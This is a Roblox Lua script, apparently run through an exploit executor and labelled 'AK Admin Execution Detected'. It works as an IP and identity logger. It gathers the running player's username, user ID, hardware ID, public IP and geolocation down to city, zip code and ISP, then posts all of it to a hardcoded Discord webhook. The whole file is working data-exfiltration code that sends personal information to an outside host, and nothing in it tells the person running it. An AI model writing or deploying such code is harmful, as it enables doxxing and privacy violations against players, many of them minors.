local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))  
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name

-- ### Choose one set of URLs at a time ###
-- Approach 1: thumbnails.roblox.com (Recommended)
-- local PlayerProfilePic = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. UserId .. "&size=150x150&format=Png&isCircular=false"
-- local GameThumbnailUrl = "https://thumbnails.roblox.com/v1/places/" .. game.PlaceId .. "/thumbnail?size=768x432&format=Png&isCircular=false"

-- Approach 2: asset-thumbnail and headshot-thumbnail endpoints
-- local PlayerProfilePic = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
-- local GameThumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"

-- Approach 3: bust-thumbnail endpoint for players
local PlayerProfilePic = "https://www.roblox.com/bust-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
local GameThumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"

local function detectExecutor()
	return identifyexecutor()
end

local function createWebhookData()
	local executor = detectExecutor()
	local date = os.date("%m/%d/%Y")
	local time = os.date("%X")
	local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
	local playerLink = "https://www.roblox.com/users/" .. UserId
	local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId

	local ipCountry = GetData.country or "N/A"
	local ipRegion = GetData.regionName or "N/A"
	local ipCity = GetData.city or "N/A"
	local ipZip = GetData.zip or "N/A"
	local ipIsp = GetData.isp or "N/A"
	local ipOrg = GetData.org or "N/A"
	local ipTimezone = GetData.timezone or "N/A"

	local data = {
		avatar_url = PlayerProfilePic,
		content = "",
		embeds = {{
			author = { name = "AK Admin Execution Detected", url = gameLink },
			description = "**Player Information**\n" ..
				string.format(
					"• [Display Name](%s): %s\n• Username: %s\n• User ID: %d\n• Membership Type: %s\n• Account Age: %d days\n• Country: %s\n• IP: %s\n• HWID: %s\n\n",
					playerLink, DisplayName, Username, UserId, MembershipType, AccountAge, Country, GetIp, Hwid
				) ..
				"**Game Information**\n" ..
				string.format(
					"• [Game Name](%s): %s\n• Game ID: %d\n• Executor: %s\n• [Join on Mobile](%s)\n\n",
					gameLink, GameName, game.PlaceId, executor, mobileJoinLink
				) ..
				"**Additional Data**\n" ..
				string.format(
					"• Country: %s\n• Region: %s\n• City: %s\n• Zip Code: %s\n• ISP: %s\n• Organization: %s\n• Timezone: %s\n\n",
					ipCountry, ipRegion, ipCity, ipZip, ipIsp, ipOrg, ipTimezone
				) ..
				"**Technical Data**\n" ..
				string.format("**Job ID:**\n```%s```", game.JobId),
			color = tonumber("0x3498db"),
			thumbnail = { url = PlayerProfilePic },
			image = { url = GameThumbnailUrl },
			footer = { text = string.format("Date: %s | Time: %s", date, time) }
		}}
	}
	return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
	local headers = {["Content-Type"] = "application/json"}
	local request = http_request or request or HttpPost or syn.request
	local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
	request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1291360471303327835/ZHwcJNzULgEftD57sQCj8WcSX7nyClHqIzTjTOgviNGXPeyRg0bTXdmX1IOE3-w6x_mW"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
